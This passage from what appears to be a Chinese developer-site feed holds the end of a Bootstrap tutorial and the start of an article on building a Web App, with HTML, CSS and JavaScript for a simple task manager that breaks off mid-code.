        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 引入Bootstrap JS 和 Popper --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h2 data-id="heading-7">关键语法：</h2>
<h3 data-id="heading-8">网格系统</h3>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-md-4"</span>&gt;</span>内容1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-md-4"</span>&gt;</span>内容2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-md-4"</span>&gt;</span>内容3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<ul>
<li><code>container</code>：固定宽度的容器</li>
<li><code>row</code>：行，包含一组列</li>
<li><code>col-md-4</code>：在中型设备(md)及以上屏幕占4列（12列网格系统）</li>
</ul>
<h3 data-id="heading-9">组件使用</h3>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-comment">&lt;!-- 导航栏 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar navbar-expand-lg navbar-dark bg-dark"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 导航内容 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 卡片 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-body"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h5</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-title"</span>&gt;</span>卡片标题<span class="hljs-tag">&lt;/<span class="hljs-name">h5</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-text"</span>&gt;</span>卡片内容<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 按钮 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-primary"</span>&gt;</span>主要按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
</code></pre>
<h2 data-id="heading-10">总结：</h2>
<h3 data-id="heading-11">⚠️ 关键要点</h3>
<ol>
<li><strong>移动优先</strong>：样式默认针对手机，大屏通过媒体查询适配</li>
<li><strong>容器选择</strong>：<code>container</code>固定宽度，<code>container-fluid</code>全宽度</li>
<li><strong>类名顺序</strong>：后面的类会覆盖前面的样式</li>
<li><strong>JS依赖</strong>：部分组件需要JavaScript才能正常工作</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Web App开发基础知识：从零构建现代化Web应用]]></title>    <link>https://juejin.cn/post/7574734686494097444</link>    <guid>https://juejin.cn/post/7574734686494097444</guid>    <pubDate>2025-11-21T05:05:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574734686494097444" data-draft-id="7574745301724315654" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Web App开发基础知识：从零构建现代化Web应用"/> <meta itemprop="keywords" content="前端,HTML"/> <meta itemprop="datePublished" content="2025-11-21T05:05:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BBB努力学习程序设计"/> <meta itemprop="url" content="https://juejin.cn/user/3097787706900985"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Web App开发基础知识：从零构建现代化Web应用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3097787706900985/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BBB努力学习程序设计
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T05:05:13.000Z" title="Fri Nov 21 2025 05:05:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在移动互联网时代，我们每天都在使用各种Web应用：在线文档、社交媒体、电商平台...这些通过浏览器访问的应用统称为Web App。与传统的网站不同，Web App提供了类似原生应用的交互体验，却无需下载安装。随着PWA（渐进式Web应用）技术的发展，Web App正在变得越来越强大！</p>
<h2 data-id="heading-0">Web App</h2>
<p><strong>Web App</strong>（Web Application）是通过Web技术（HTML、CSS、JavaScript）构建的应用程序，运行在浏览器环境中，具有以下特点：</p>
<ul>
<li><strong>交互性强</strong>：提供丰富的用户交互</li>
<li><strong>数据驱动</strong>：与服务器频繁交换数据</li>
<li><strong>功能完整</strong>：能完成复杂业务逻辑</li>
<li><strong>跨平台</strong>：在任何有浏览器的设备上运行</li>
</ul>
<h2 data-id="heading-1">Web App核心技术栈</h2>
<h3 data-id="heading-2">1. HTML5 - 应用骨架</h3>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>我的Web App<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- PWA配置 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"manifest"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"manifest.json"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 移动端适配 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"theme-color"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"#2196F3"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 应用外壳 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"app"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">header</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"app-header"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我的任务管理器<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">main</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"app-main"</span>&gt;</span>
            <span class="hljs-comment">&lt;!-- 动态内容区域 --&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"content"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">footer</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"app-footer"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bottom-nav"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item active"</span> <span class="hljs-attr">data-page</span>=<span class="hljs-string">"home"</span>&gt;</span>首页<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span> <span class="hljs-attr">data-page</span>=<span class="hljs-string">"tasks"</span>&gt;</span>任务<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span> <span class="hljs-attr">data-page</span>=<span class="hljs-string">"profile"</span>&gt;</span>我的<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 服务Worker注册 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-keyword">if</span> (<span class="hljs-string">'serviceWorker'</span> <span class="hljs-keyword">in</span> navigator) {
            navigator.<span class="hljs-property">serviceWorker</span>.<span class="hljs-title function_">register</span>(<span class="hljs-string">'/sw.js'</span>);
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">2. CSS3 - 应用样式</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 移动优先的响应式设计 */</span>
* {
    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">box-sizing</span>: border-box;
}

<span class="hljs-selector-tag">body</span> {
    <span class="hljs-attribute">font-family</span>: -apple-system, BlinkMacSystemFont, <span class="hljs-string">'Segoe UI'</span>, Roboto, sans-serif;
    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.6</span>;
    <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
}

<span class="hljs-comment">/* 应用布局 */</span>
<span class="hljs-selector-id">#app</span> {
    <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>;
    <span class="hljs-attribute">display</span>: flex;
    <span class="hljs-attribute">flex-direction</span>: column;
}

<span class="hljs-selector-class">.app-header</span> {
    <span class="hljs-attribute">background</span>: <span class="hljs-number">#2196F3</span>;
    <span class="hljs-attribute">color</span>: white;
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">1rem</span>;
    <span class="hljs-attribute">text-align</span>: center;
    <span class="hljs-attribute">position</span>: sticky;
    <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">z-index</span>: <span class="hljs-number">100</span>;
}

<span class="hljs-selector-class">.app-main</span> {
    <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">1rem</span>;
    <span class="hljs-attribute">overflow-y</span>: auto;
}

<span class="hljs-selector-class">.app-footer</span> {
    <span class="hljs-attribute">border-top</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#e0e0e0</span>;
    <span class="hljs-attribute">background</span>: white;
}

<span class="hljs-comment">/* 底部导航 */</span>
<span class="hljs-selector-class">.bottom-nav</span> {
    <span class="hljs-attribute">display</span>: flex;
    <span class="hljs-attribute">justify-content</span>: space-around;
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0.5rem</span>;
}

<span class="hljs-selector-class">.nav-item</span> {
    <span class="hljs-attribute">background</span>: none;
    <span class="hljs-attribute">border</span>: none;
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0.5rem</span> <span class="hljs-number">1rem</span>;
    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">20px</span>;
    <span class="hljs-attribute">cursor</span>: pointer;
    <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.3s</span> ease;
}

<span class="hljs-selector-class">.nav-item</span><span class="hljs-selector-class">.active</span> {
    <span class="hljs-attribute">background</span>: <span class="hljs-number">#2196F3</span>;
    <span class="hljs-attribute">color</span>: white;
}

<span class="hljs-comment">/* 任务列表样式 */</span>
<span class="hljs-selector-class">.task-list</span> {
    <span class="hljs-attribute">list-style</span>: none;
}

<span class="hljs-selector-class">.task-item</span> {
    <span class="hljs-attribute">background</span>: white;
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">1rem</span>;
    <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">0.5rem</span>;
    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
    <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>);
    <span class="hljs-attribute">display</span>: flex;
    <span class="hljs-attribute">align-items</span>: center;
    <span class="hljs-attribute">justify-content</span>: space-between;
}

<span class="hljs-selector-class">.task-item</span><span class="hljs-selector-class">.completed</span> {
    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.6</span>;
    <span class="hljs-attribute">text-decoration</span>: line-through;
}

<span class="hljs-comment">/* 响应式设计 */</span>
<span class="hljs-keyword">@media</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">768px</span>) {
    <span class="hljs-selector-id">#app</span> {
        <span class="hljs-attribute">max-width</span>: <span class="hljs-number">400px</span>;
        <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;
        <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">20px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>);
        <span class="hljs-attribute">min-height</span>: <span class="hljs-number">80vh</span>;
        <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">5vh</span>;
    }
}
</code></pre>
<h3 data-id="heading-4">3. JavaScript - 应用逻辑</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 应用状态管理</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TaskManager</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span> = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'tasks'</span>)) || [];
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentPage</span> = <span class="hljs-string">'home'</span>;
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>();
    }

    <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">bindEvents</span>();
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">render</span>();
    }

    <span class="hljs-title function_">bindEvents</span>(<span class="hljs-params"/>) {
        <span class="hljs-comment">// 导航事件</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.nav-item'</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">button</span> =&gt;</span> {
            button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">switchPage</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">dataset</span>.<span class="hljs-property">page</span>);
            });
        });

        <span class="hljs-comment">// 添加任务事件</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'addTaskBtn'</span>)?.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addTask</span>();
        });

        <span class="hljs-comment">// 任务操作事件委托</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'taskList'</span>)?.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
            <span class="hljs-keyword">if</span> (e.<span class="hljs-property">target</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">contains</span>(<span class="hljs-string">'complete-btn'</span>)) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">toggleTask</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">dataset</span>.<span class="hljs-property">id</span>);
            }
            <span class="hljs-keyword">if</span> (e.<span class="hljs-property">target</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">contains</span>(<span class="hljs-string">'delete-btn'</span>)) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">deleteTask</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">dataset</span>.<span class="hljs-property">id</span>);
            }
        });
    }

    <span class="hljs-title function_">switchPage</span>(<span class="hljs-params">page</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentPage</span> = page;
        
        <span class="hljs-comment">// 更新导航状态</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.nav-item'</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">btn</span> =&gt;</span> {
            btn.<span class="hljs-property">classList</span>.<span class="hljs-title function_">toggle</span>(<span class="hljs-string">'active'</span>, btn.<span class="hljs-property">dataset</span>.<span class="hljs-property">page</span> === page);
        });
        
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">render</span>();
    }

    <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">const</span> content = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'content'</span>);
        
        <span class="hljs-keyword">switch</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentPage</span>) {
            <span class="hljs-keyword">case</span> <span class="hljs-string">'home'</span>:
                content.<span class="hljs-property">innerHTML</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderHome</span>();
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-string">'tasks'</span>:
                content.<span class="hljs-property">innerHTML</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderTasks</span>();
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-string">'profile'</span>:
                content.<span class="hljs-property">innerHTML</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">renderProfile</span>();
                <span class="hljs-keyword">break</span>;
        }
    }

    <span class="hljs-title function_">renderHome</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">const</span> completed = <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">task</span> =&gt;</span> task.<span class="hljs-property">completed</span>).<span class="hljs-property">length</span>;
        <span class="hljs-keyword">const</span> total = <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span>.<span class="hljs-property">length</span>;
        
        <span class="hljs-keyword">return</span> <span class="hljs-string">`
            &lt;div class="home-page"&gt;
                &lt;div class="stats-card"&gt;
                    &lt;h3&gt;任务统计&lt;/h3&gt;
                    &lt;div class="stats"&gt;
                        &lt;div class="stat-item"&gt;
                            &lt;span class="stat-number"&gt;<span class="hljs-subst">${total}</span>&lt;/span&gt;
                            &lt;span class="stat-label"&gt;总任务&lt;/span&gt;
                        &lt;/div&gt;
                        &lt;div class="stat-item"&gt;
                            &lt;span class="stat-number"&gt;<span class="hljs-subst">${completed}</span>&lt;/span&gt;
                            &lt;span class="stat-label"&gt;已完成&lt;/span&gt;
                        &lt;/div&gt;
                        &lt;div class="stat-item"&gt;
                            &lt;span class="stat-number"&gt;<span class="hljs-subst">${total - completed}</span>&lt;/span&gt;
                            &lt;span class="stat-label"&gt;待完成&lt;/span&gt;
                        &lt;/div&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
                
                &lt;div class="quick-actions"&gt;
                    &lt;button id="addTaskBtn" class="btn-primary"&gt;添加新任务&lt;/button&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        `</span>;
    }

    <span class="hljs-title function_">renderTasks</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">`
            &lt;div class="tasks-page"&gt;
                &lt;div class="task-input"&gt;
                    &lt;input type="text" id="taskInput" placeholder="输入新任务..."&gt;
                    &lt;button id="addTaskBtn" class="btn-primary"&gt;添加&lt;/button&gt;
                &lt;/div&gt;
                
                &lt;ul id="taskList" class="task-list"&gt;
                    <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.tasks.map(task =&gt; <span class="hljs-string">`
                        &lt;li class="task-item <span class="hljs-subst">${task.completed ? <span class="hljs-string">'completed'</span> : <span class="hljs-string">''</span>}</span>"&gt;
                            &lt;span&gt;<span class="hljs-subst">${task.text}</span>&lt;/span&gt;
                            &lt;div class="task-actions"&gt;
                                &lt;button class="complete-btn" data-id="<span class="hljs-subst">${task.id}</span>"&gt;
